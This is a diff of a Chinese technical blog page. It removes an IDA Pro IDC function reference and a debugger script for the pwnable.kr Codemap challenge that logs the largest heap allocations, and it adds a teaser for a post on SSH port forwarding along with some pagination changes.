-<li>string ltoa(long val, long radix)  以指定的radix(2、8、10或16)返回val的字符串值</li>
-<li>string ord(string ch)  返回单字符字符串ch的ASCII值</li>
-<li>long strlen(string str)  返回所提供字符串的长度</li>
-<li>long strstr(string str, string substr)  返回str中substr的索引，如果没有发现子字符串，则返回-1</li>
-<li>string substr(string str, long start, long end)  返回包含str中由start到end-1位置的字符的子字符串。如果使用分片，此字符串等同于str[start:end]</li>
-</ul>
-<h3 id="2-4-文件输入-输出函数"><a href="#2-4-文件输入-输出函数" class="headerlink" title="2.4 文件输入/输出函数"></a>2.4 文件输入/输出函数</h3><ul>
-<li>long fopen(string filename, string mode)  返回一个整数文件句柄（如果发生错误，则返回0），供所有IDC文件 输入/输出函数使用。mode参数与C语言的fopen函数使用相同的模式(r,w,等)</li>
-<li>void fclose(long handle)  关闭fopen中文件句柄指定的文件</li>
-<li>void filelength(long handle)  返回指定文件的长度，如果发生错误，则返回-1</li>
-<li>long fgetc(long handle)  从给定文件中读取一个字节。如果发生错误，则返回-1</li>
-<li>long fputc(long val, long handle)  写入一个字节到指定文件中，如果操作成功，则返回0；如果发生错误，则返回-1</li>
-<li>long fprintf(long handle, string format, ...)  将格式化字符串写入到指定文件中</li>
-<li>long writestr(long handle, string str)  将指定的字符串写入到给定文件中</li>
-<li>string/long readstr(long handle)  从给定文件中读取一个字符串。这个函数读取到下一个换行符位置的所有字符（包括非ASCII字符），包括换行符本身（ASCII 0x0a）。操作成功，返回字符串；如果读到文件结尾，则返回-1</li>
-<li>long writelong(long handle, long val, long bigendian)  使用大端(bigendian=1)或小端(bigendian=0)字节顺序将一个4字节整数写入到指定文件</li>
-<li>long readlong(long handle, long bigendian)  使用大端(bigendian=1)或小端(bigendian=0)字节顺序从给定文件中读取一个4字节整数</li>
-<li>long writeshort(long handle, long val, long bigendian)  使用大端(bigendian=1)或小端(bigendian=0)字节顺序将一个2字节整数写入到指定文件</li>
-<li>long readshort(long handle, long bigendian)  使用大端(bigendian=1)或小端(bigendian=0)字节顺序从给定文件中读取一个2字节整数</li>
-<li>bool loadfile(long handle, long pos, long addr, long length)  从给定文件的pos位置读取length数量的字节，并将这些字节写入到以addr地址开头的数据库中</li>
-<li>bool savefile(long handle, long pos, long addr, long length)  将以addr数据库地址开头的length数量的字节写入到给定文件的pos位置</li>
-</ul>
-<h3 id="2-5-操纵数据库名称"><a href="#2-5-操纵数据库名称" class="headerlink" title="2.5 操纵数据库名称"></a>2.5 操纵数据库名称</h3><ul>
-<li>string Name(long addr)  返回与给定地址有关的名称，如果该位置没有名称，则返回空字符串。如果名称被标记为局部名称，这个函数并不敢回用户定义的名称</li>
-<li>string NameEx(long from, long addr)  返回与addr有关的名称。如果该位置没有名称，则返回空字符串。如果from是一个同样包含addr的函数中的地址，则这个函数返回用户定义的局部名称。</li>
-<li>bool MakeNameEx(long addr, string name, long flags)  将给定的名称分配给给定的地址。改名称使用flags位掩码中指定的属性创建而成。这些标志在帮助系统中的MakeNameEx文档中记载描述，可以用于指定各种属性，如名称是局部名称还是公共名称、名称是否应在名称窗口中列出。</li>
-<li>long LockByName(string name)  返回一个位置（名称已给定）的地址。如果数据库中没有该名称，则返回BADADDR(-1)</li>
-<li>long LockByNameEx(long funcaddr, string localname)  在包含funcaddr的函数中搜索给定的局部名称。如果给定的函数中没有这个名称，则返回BADADDR（-1）</li>
-</ul>
-<h3 id="2-6-处理函数的函数"><a href="#2-6-处理函数的函数" class="headerlink" title="2.6 处理函数的函数"></a>2.6 处理函数的函数</h3><ul>
-<li>long GetFunctionAttr(long addr, long attrib)  返回包含给定地址的函数的被请求的属性。文档中有属性常量。如要查找一个函数的结束地址，可以使用GetFunctionAttr(addr, FUNCTION_END)</li>
-<li>string GetFunctionName(long addr)  返回包含给定地址的函数的名称。如果给定地址并不属于一个函数，则返回一个空字符串</li>
-<li>long NextFunction(long addr)  返回给定地址后的下一个函数的起始地址。如果数据库中给定地址后没有其他函数，则返回-1</li>
-<li>long PrevFunction(long addr)  返回给定地址之前距离最近的函数的起始地址。如果数据库中给定地址后没有其他函数，则返回-1</li>
-</ul>
-<p>当然，也可以通过函数名，使用LockByName函数查找函数的起始地址</p>
-<h3 id="2-7-代码交叉引用函数"><a href="#2-7-代码交叉引用函数" class="headerlink" title="2.7 代码交叉引用函数"></a>2.7 代码交叉引用函数</h3><ul>
-<li>long Rfirst(long from)  返回给定地址向其转交控制权的第一个位置。如果给定地址没有引用其他地址，则返回BADAADDR（-1）</li>
-<li>long Rnext(long from, long current)  如果current已经在前一次调用Rfirst或Rnext时返回，则返回给定地址(from)转交控制权的下一个位置。如果没有其他交叉引用存在，则返回BADADDR</li>
-<li>long XrefType()  返回一个常量，说明某个交叉引用查询函数（如Rfirst）返回的最后一个交叉引用的类型。对于代码交叉引用，这些常量包括fl_CN（近调用）、fl_CF（远调用）、fl_JN（近跳转）、fl_JF（远跳转）和fl_F（普通顺序流）</li>
-<li>long RfirstB(long to)  返回转交控制权到给定地址的第一个位置。如果不存在对给定地址的交叉引用，则返回BADADDR（-1）</li>
-<li>long RnextB(long to, long current)  如果current已经在前一次调用RfirstB或RnextB时返回，则返回下一个转交控制权给给定地址(to)的位置。如果不存在其他堆给定位置的交叉引用，则返回BADADDR（-1）</li>
-</ul>
-<p>每次调用一个交叉引用函数，IDA都会设置一个内部IDC状态变量，指出返回的最后一个交叉引用的类型。如果需要知道你收到的交叉引用的类型，那么在调用其他交叉引用查询函数之前，必须调用XrefType函数</p>
-<h3 id="2-8-数据交叉引用函数"><a href="#2-8-数据交叉引用函数" class="headerlink" title="2.8 数据交叉引用函数"></a>2.8 数据交叉引用函数</h3><ul>
-<li>long Dfirst(long from)  返回给定地址引用一个数据值得第一个位置。如果给定地址没有引用其他地址，则返回BADADDR</li>
-<li>long Dnext(long from, long current)   如果current已经在前一次调用Dfirst或Dnext时返回，则返回给定地址(from)向其引用一个数据值的下一个位置。如果没有其他交叉引用存在，则返回BADADDR</li>
-<li>long XrefType()   返回一个常量，说明某个交叉引用查询函数（如Dfirst）返回的最后一个交叉引用的类型。对于数据交叉引用，这些常量包括dr_0（提供的偏移量）、dr_w（数据写入）和dr_R（数据读取）</li>
-<li>long DfirstB(long to)  返回将给定地址作为数据引用的第一个位置。如果不存在引用给定地址的交叉引用，则返回BADADDR</li>
-<li>long DnextB(long to, long current)  如果current已经在前一次调用DfirstB或DnextB时返回，则返回将给定地址（to）作为数据引用的下一个位置。如果没有其他对给定地址的交叉引用存在，则返回BADADDR</li>
-</ul>
-<p>和代码交叉引用一样，如果需要知道你收到的交叉引用的类型，那么在调用另一个交叉引用查询函数之前，必须调用XrefType函数</p>
-<h3 id="2-9-数据库操纵函数"><a href="#2-9-数据库操纵函数" class="headerlink" title="2.9 数据库操纵函数"></a>2.9 数据库操纵函数</h3><ul>
-<li>void MakeUnkn(long addr, long flags)  取消位于指定地址的项的定义。这里的标志指出是否也取消随后的想的定义，以及是否删除任何与取消定义的项有关的名称。</li>
-<li>long MakeCode(long addr)  将位于指定地址的字节转换成一条指令</li>
-<li>long MakeByte(long addr)   将位于指定地址的项目转换成一个数据字节</li>
-<li>long MakeWord(long addr)</li>
-<li>long MakeDword(long addr)</li>
-<li>bool MakeComm(long addr, string comment)  在给定的地址处添加一条常规注释</li>
-<li>bool MakeFunction(long begin, long end)  将有begin到end的指令转换成一个函数。如果end被指定为BADADDR（-1），IDA会尝试通过定位函数的返回指令，来自动确定该函数的结束地址</li>
-<li>bool MakeStr(long begin, long end)  创建一个当前字符串(由GetStringType返回)类型的字符串，涵盖由begin到end-1之间的所有字节。如果end被指定为BADADDR，IDA会尝试自动确定字符串的结束地址</li>
-</ul>
-<h3 id="2-10-数据库搜索函数"><a href="#2-10-数据库搜索函数" class="headerlink" title="2.10 数据库搜索函数"></a>2.10 数据库搜索函数</h3><p>三个最常见的标志为</p>
-<ol>
-<li>SEARCH_DOWN  搜索操作扫描高位地址</li>
-<li>SEARCH_NEXT  略过当前匹配项，扫描下一个匹配项</li>
-<li>SEARCH_CASE  区分大小写的方式进行二进制和文本搜索</li>
-</ol>
-<ul>
-<li>long FindCode(long addr, long flags)  从给定的地址搜索一条指令</li>
-<li>long FindDate(long addr, long flags)   从给定的地址搜索一个数据项</li>
-<li>long FindBinary(long addr, long flags, string binary)  从给定的地址搜索一个字节序列。字符串binary指定一个十六进制字节序列值。如果没有设置SEARCH_CASE，且一个字节值指定一个大写或小写ASCII字母，则搜索仍然会匹配对应的互补值。例如&quot;41 42&quot;将匹配&quot;61 62&quot;、&quot;61 42&quot;等</li>
-<li>long FindText(long addr, long flags, long row, long column, string text)  在约定的地址，从给定行(row)的给定列搜索字符串text。注意，某个给定地址的反汇编文本可能会跨越几行，因此要指定从哪一行开始搜索</li>
-</ul>
-<h3 id="2-11-反汇编行组件"><a href="#2-11-反汇编行组件" class="headerlink" title="2.11 反汇编行组件"></a>2.11 反汇编行组件</h3><ul>
-<li>string GetDisasm(long addr)  返回给定地址的反汇编文本。返回的文本包括任何注释，但不包括地址信息</li>
-<li>string GetMnem(long addr)  返回位于给定地址的指令的助记符部分</li>
-<li>string GetOpnd(long addr, long opnum)  返回给定地址的指定操作数的文本形式。IDA以0为其实编号，从左向右对操作数编号</li>
-<li>long GetOpType(long addr, long opnum)  返回一个整数，指出给定地址的给定操作数的类型。</li>
-<li>long GetOperandValue(long addr, long opnum)  返回与给定地址的给定操作数有关的整数值。返回值的性质取决于GetOpType指定的给定操作数的类型</li>
-<li>string CommentEx(long addr, long type)  返回给定地址处的注释文本。如果type为0，则返回常规注释文本；如果type为1，则返回可重复注释的文本。如果给定地址没注释，则返回空字符串。</li>
-</ul>
-<h2 id="3、IDC脚本示例"><a href="#3、IDC脚本示例" class="headerlink" title="3、IDC脚本示例"></a>3、IDC脚本示例</h2><h3 id="3-1-pwnable-kr中Codemap的idc脚本"><a href="#3-1-pwnable-kr中Codemap的idc脚本" class="headerlink" title="3.1 pwnable.kr中Codemap的idc脚本"></a>3.1 pwnable.kr中Codemap的idc脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">#include &lt;idc.idc&gt;  </div><div class="line"></div><div class="line">static main()&#123;  </div><div class="line"></div><div class="line">    auto max_eax, max_ebx, second_eax, second_ebx, third_eax, third_ebx;  </div><div class="line">    auto eax, ebx;  </div><div class="line"></div><div class="line">    // 依次为前三大堆块分配完成时的eax和ebx值</div><div class="line">    max_eax = 0;  </div><div class="line">    second_eax = 0;  </div><div class="line">    third_eax = 0;  </div><div class="line">    max_ebx = 0;  </div><div class="line">    second_ebx = 0;  </div><div class="line">    third_ebx = 0;  </div><div class="line"></div><div class="line">    AddBpt(0x1173E65);      // 在提示位置添加断点，在IDA中该地址为0x1173E65</div><div class="line">    StartDebugger(&quot;&quot;,&quot;&quot;,&quot;&quot;);  </div><div class="line">    auto count;  </div><div class="line">    for(count = 0; count &lt; 999; count ++)&#123;  </div><div class="line">        auto code = GetDebuggerEvent(WFNE_SUSP|WFNE_CONT, -1);  </div><div class="line">        eax = GetRegValue(&quot;EAX&quot;);     // 中断时得到所需的值</div><div class="line">        ebx = GetRegValue(&quot;EBX&quot;);  </div><div class="line"></div><div class="line">        // 判断是否应刷新前三大堆块的值</div><div class="line">        if(max_eax &lt; eax)&#123;  </div><div class="line">            third_eax = second_eax;  </div><div class="line">            third_ebx = second_ebx;  </div><div class="line">            second_eax = max_eax;  </div><div class="line">            second_ebx = max_ebx;  </div><div class="line">            max_eax = eax;  </div><div class="line">            max_ebx = ebx;  </div><div class="line">        &#125;else if(second_eax &lt; eax)&#123;  </div><div class="line">            third_eax = second_eax;  </div><div class="line">            third_ebx = second_ebx;  </div><div class="line">            second_eax = eax;  </div><div class="line">            second_ebx = ebx;  </div><div class="line">        &#125;else if(third_eax &lt; eax)&#123;  </div><div class="line">            third_eax = eax;  </div><div class="line">            third_ebx = ebx;  </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">    // 输出</div><div class="line">    Message(&quot;max eax: %d, ebx: %x, second eax: %d, ebx: %x, third eax: %d, ebx: %x\n&quot;, max_eax, max_ebx, second_eax, second_ebx, third_eax, third_ebx);  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<ul>
-<li>AddBpt(0x1173E65)   设置断点</li>
-<li>StartDebugger(&quot;&quot;,&quot;&quot;,&quot;&quot;)   这里是直接启用本地调试器</li>
-<li>auto code = GetDebuggerEvent(WFNE_SUSP|WFNE_CONT, -1)</li>
-<li>eax = GetRegValue(&quot;EAX&quot;);     // 中断时得到所需的值</li>
-</ul>
-
-          
+          第一部分 概述当你在咖啡馆享受免费 WiFi 的时候，有没有想到可能有人正在窃取你的密码及隐私信息？当你发现实验室的防火墙阻止了你的网络应用端口，是不是有苦难言？来看看 SSH 的端口转发功能能给我们带来什么好处吧！
+端口转发概述让我们先来了解一下端口转发的概念吧。我们知道，SSH 会自动加密和解密
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/12/07/web/ssh端口转发/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2265,7 +1071,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/25/">25</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2326,7 +1132,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-count">12</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -2337,7 +1143,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-count">55</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
